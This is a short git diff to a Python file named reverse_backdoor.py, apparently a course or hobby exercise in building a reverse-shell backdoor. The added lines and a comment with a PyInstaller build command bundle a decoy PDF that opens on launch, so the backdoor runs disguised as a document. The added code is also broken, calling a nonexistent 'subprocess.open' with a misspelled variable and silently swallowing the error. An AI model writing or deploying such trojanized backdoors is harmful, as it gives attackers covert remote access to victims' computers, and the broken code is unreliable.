@@ -74,6 +74,12 @@ class Backdoor:
         
         self.connection.close()
 
+# wine pyinstaller --add-data "/home/kali/Downloads/sample.pdf,." --onefile --noconsole reverse_backdoor.py
+try:
+    file_name = sys._MEIPASS + "\sample.pdf"
+    subprocess.open(filename,shell=True)
+except Exception:
+    pass
 
 try:
     my_backdoor = Backdoor("127.0.0.1", 4444)
